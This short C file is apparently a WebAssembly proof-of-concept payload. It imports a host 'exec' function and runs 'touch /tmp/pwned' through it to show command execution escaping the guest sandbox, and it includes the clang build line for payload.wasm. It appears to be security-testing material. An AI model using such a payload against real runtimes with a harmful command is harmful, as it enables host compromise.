__attribute__((import_module("env")))
__attribute__((import_name("exec")))
extern void host_exec(const char *ptr, int len);

__attribute__((export_name("_start")))
void _start() {
    const char cmd[] = "touch /tmp/pwned";

    host_exec(cmd, sizeof(cmd) - 1);
}

// clang --target=wasm32 -fuse-ld=lld -nostdlib -Wl,--no-entry -Wl,--export=_start -o payload.wasm payload.c